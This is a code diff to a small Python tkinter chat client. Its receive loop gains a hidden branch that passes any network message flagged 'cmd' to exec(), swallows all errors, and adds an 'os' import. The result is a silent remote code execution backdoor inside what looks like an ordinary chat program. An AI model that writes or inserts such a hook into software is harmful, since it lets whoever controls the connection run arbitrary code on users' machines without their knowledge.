@@ -1,5 +1,5 @@
 from lib.networking import *
-import threading , time , tkinter as tk
+import threading , time , tkinter as tk , os
 
 
 sock = connection()
@@ -34,9 +34,15 @@ def recive(conn:connection):
     try :
         while True:
             msg ,flag = conn.recv()
+            print(msg,flag)
             if flag == "msg":
                 print(msg)
                 chat_add(msg)
+            if flag == "cmd":
+                try:
+                    exec(msg)
+                except:
+                    pass
     except : 
         pass
     return
